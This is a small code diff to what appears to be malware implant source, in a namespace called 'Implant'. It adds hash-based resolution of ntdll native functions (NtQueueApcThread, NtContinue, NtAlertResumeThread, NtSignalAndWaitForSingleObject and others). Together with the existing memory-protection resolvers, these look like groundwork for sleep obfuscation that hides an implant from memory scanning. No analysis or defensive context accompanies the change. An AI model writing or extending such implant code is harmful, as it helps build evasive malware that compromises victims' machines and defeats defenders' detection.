@@ -79,6 +79,12 @@ namespace Implant {
             }
         }
 
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtDelayExecution,              Ctx->modules.ntdll, NTDELAYEXECUTION));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateEvent,                 Ctx->modules.ntdll, NTCREATEEVENT));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueueApcThread,              Ctx->modules.ntdll, NTQUEUEAPCTHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtContinue,                    Ctx->modules.ntdll, NTCONTINUE));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtAlertResumeThread,           Ctx->modules.ntdll, NTALERTRESUMETHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtSignalAndWaitForSingleObject, Ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ;
         x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ;
         x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY)) ;
